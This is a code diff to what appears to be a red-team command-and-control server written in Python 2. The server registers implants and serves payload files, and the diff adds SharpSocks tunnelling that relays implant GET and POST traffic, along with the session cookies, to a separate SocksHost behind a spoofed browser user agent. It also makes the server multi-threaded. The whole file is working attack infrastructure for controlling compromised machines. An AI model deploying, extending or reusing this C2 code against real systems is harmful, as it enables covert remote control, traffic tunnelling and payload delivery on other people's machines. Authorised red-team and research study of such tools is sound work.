@@ -1,21 +1,25 @@
 #!/usr/bin/env python
 
-import argparse, os, sys, re, datetime, time, base64, BaseHTTPServer, re, logging, ssl, signal, ssl
+import argparse, os, sys, re, datetime, time, base64, BaseHTTPServer, re, logging, ssl, signal, ssl, urllib2
 
 from Implant import Implant 
 from Tasks import newTask
 from Core import decrypt, encrypt, default_response, decrypt_bytes_gzip
 from Colours import Colours
-from DB import select_item, get_implants_all, update_implant_lastseen, update_task, get_cmd_from_task_id, get_c2server_all
+from DB import select_item, get_implants_all, update_implant_lastseen, update_task, get_cmd_from_task_id, get_c2server_all, get_sharpurls
 from DB import update_item, get_task_owner, get_newimplanturl, initializedb, setupserver, new_urldetails, get_baseenckey
 from Payloads import Payloads
-from Config import ROOTDIR, ServerHeader, PayloadsDirectory, HTTPResponse, DownloadsDirectory, Database, HostnameIP
+from Config import ROOTDIR, ServerHeader, PayloadsDirectory, HTTPResponse, DownloadsDirectory, Database, HostnameIP, SocksHost
 from Config import QuickCommand, KillDate, DefaultSleep, DomainFrontHeader, ServerPort, urlConfig, HOST_NAME, PORT_NUMBER
 from Config import DownloadURI, Sounds, APIKEY, MobileNumber, URLS, SocksURLS, Insecure, UserAgent, Referrer, APIToken
 from Config import APIUser, EnableNotifications
 from Cert import create_self_signed_cert
 from Help import logopic
 from Utils import validate_sleep_time, randomuri, gen_key
+
+from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
+from SocketServer import ThreadingMixIn
+import threading
 
 class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 
@@ -48,6 +52,14 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         new_implant_url = get_newimplanturl()
         s.cookieHeader = s.headers.get('Cookie')
         QuickCommandURI = select_item("QuickCommand", "C2Server")
+        UriPath = str(s.path)
+        sharpurls = get_sharpurls().split(",")
+        sharplist = []
+        for i in sharpurls:
+          i=i.replace(" ","")
+          i=i.replace("\"","")
+          sharplist.append("/"+i)
+
         s.server_version = ServerHeader
         s.sys_version = ""
         if not s.cookieHeader:
@@ -61,6 +73,26 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           s.send_header("Content-type", "text/html")
           s.end_headers()
           s.wfile.write(new_task)
+
+        elif any(UriPath in s for s in sharplist):
+          #print ("SharpSocks %s in %s" % (i,s.path))
+          #print (s.cookieHeader)
+          #message =  threading.currentThread().getName()
+          #print (message)
+          try:
+            open("%swebserver.log" % ROOTDIR, "a").write("[+] Making GET connection to SharpSocks %s%s\r\n" % (SocksHost,UriPath))
+            r=urllib2.Request("%s%s" % (SocksHost,UriPath), headers={'Accept-Encoding': 'gzip', 'Cookie':'%s' % s.cookieHeader, 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36'})
+            res = urllib2.urlopen(r)
+            sharpout = res.read()
+            s.send_response(200)
+            s.send_header("Content-type", "text/html")
+            s.send_header("Connection", "close")
+            s.send_header("Content-Length", len(sharpout))
+            s.end_headers()
+            s.wfile.write(sharpout)
+          except Exception as e:
+            print ("%s" % e)
+            print ("Error with socks, could be connection - is sharpsocks running")
 
         elif ("%s_bs" % QuickCommandURI) in s.path:
           filename = "%spayload.bat" % (PayloadsDirectory)
@@ -136,6 +168,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           s.send_header("Content-type", "application/x-msdownload")
           s.end_headers()
           s.wfile.write(content)
+
         # register new implant
         elif new_implant_url in s.path and s.cookieHeader.startswith("SessionID"):
           implant_type = "Normal"
@@ -229,6 +262,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           post_data = s.rfile.read(content_length)
           logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n", str(s.path), str(s.headers), post_data)
           now = datetime.datetime.now()
+
           result = get_implants_all()
           for i in result:
             implantID = i[0]
@@ -359,14 +393,37 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           pass 
           
         finally:
-          s.send_response(200)
-          s.send_header("Content-type", "text/html")
-          s.end_headers()
-          s.wfile.write(default_response())
+          UriPath = str(s.path)
+          sharpurls = get_sharpurls().split(",")
+          sharplist = []
+          for i in sharpurls:
+            i=i.replace(" ","")
+            i=i.replace("\"","")
+            sharplist.append("/"+i)
+
+          if any(UriPath in s for s in sharplist):
+            open("%swebserver.log" % ROOTDIR, "a").write("[+] Making POST connection to SharpSocks %s%s\r\n" % (SocksHost,UriPath))
+            r=urllib2.Request("%s%s" % (SocksHost,UriPath), headers={'Cookie':'%s' % s.cookieHeader})
+            res = urllib2.urlopen(r, post_data)
+            s.send_response(200)
+            s.send_header("Content-type", "text/html")
+            s.end_headers()
+            s.wfile.write(res.read())
+          else:
+            s.send_response(200)
+            s.send_header("Content-type", "text/html")
+            s.end_headers()
+            s.wfile.write(default_response())
+
+ThreadingMixIn.daemon_threads = True
+class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
+    """Handle requests in a separate thread."""
 
 if __name__ == '__main__':
-    server_class = BaseHTTPServer.HTTPServer
-    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
+    
+    httpd = ThreadedHTTPServer((HOST_NAME, PORT_NUMBER), MyHandler)
+    #server_class = BaseHTTPServer.HTTPServer
+    #httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
     try:
       if os.name == 'nt':
         os.system('cls')
